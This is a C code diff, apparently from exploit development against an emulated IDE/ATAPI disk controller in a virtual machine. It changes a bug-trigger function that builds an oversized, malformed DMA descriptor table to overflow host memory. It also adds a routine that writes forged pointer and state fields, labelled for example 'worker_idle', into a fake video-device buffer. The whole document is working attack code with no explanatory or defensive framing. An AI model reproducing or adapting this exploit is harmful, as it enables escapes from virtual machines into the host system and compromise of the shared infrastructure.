@@ -298,22 +298,30 @@ unsigned char ide_atapi_bug_trigger() {
 	if (err) return err;
 	region_desc* prd_table = channels[channel].prd_table;
 
-	uint8_t* addr = physical_alloc(0x10000,0x10000);
-	memset(addr,'\xcc',0x10000);
+	uint32_t* addr = (uint32_t*)physical_alloc(0x10000,0x10000);
+	memset(addr,'\x01',0x10000);
 	uint8_t fake_secs = 4;
-	uint8_t really_secs = 20;
+	// uint8_t really_secs = 20;
 	for (int i = 0; i < fake_secs; i++) {
 		prd_table[i].address = (uint32_t)addr;
-		prd_table[i].count = 0x1000;
+		prd_table[i].count = 0x4000;
 		prd_table[i].end = 0;
 	}
-	prd_table[fake_secs-1].end = 0x8000;
-	for (int i = fake_secs; i < really_secs; i++) {
+	prd_table[fake_secs - 1].end = 0x8000;
+	// 0x50000
+	for(int i=fake_secs;i< fake_secs + 4;i++){
 		prd_table[i].address = (uint32_t)addr;
 		prd_table[i].count = 0;
 		prd_table[i].end = 0;
 	}
-	prd_table[really_secs-1].end = 0x8000;
+	uint8_t* video = physical_alloc(0x10000,0x10000);
+	memset(video,'\xcc',0x10000);
+	void setup_fake_video(uint8_t* video);
+	setup_fake_video(video);
+	prd_table[fake_secs + 4].address = (uint32_t)video;
+	prd_table[fake_secs + 4].count = 0x3000;
+	prd_table[fake_secs + 4].end = 0x8000;
+
 	outl(channels[channel].bmide + IDE_DMA_PRD,(uint32_t)prd_table);
 	void create_task(void (*p)(void*),void* arg);
 
@@ -341,7 +349,18 @@ static void task(void* arg){
 		*ptr = 0;
 	}
 }
+#define FAKE_COND 0x1A0000000
+void setup_fake_video(uint8_t* video){
+	*(uint64_t*)(video+0x8c8) = 0;
+	*(uint64_t*)(video+0x848) = 0;
+	*(uint64_t*)(video+0x908) = 0;
+	*(uint64_t*)(video+0x860) = FAKE_COND;
+	// *(uint8_t*)(FAKE_COND + 4) = 1;
+	
 
+	*(uint64_t*)(video+0x8e8) = FAKE_COND; // worker_idle
+
+}
 
 
 
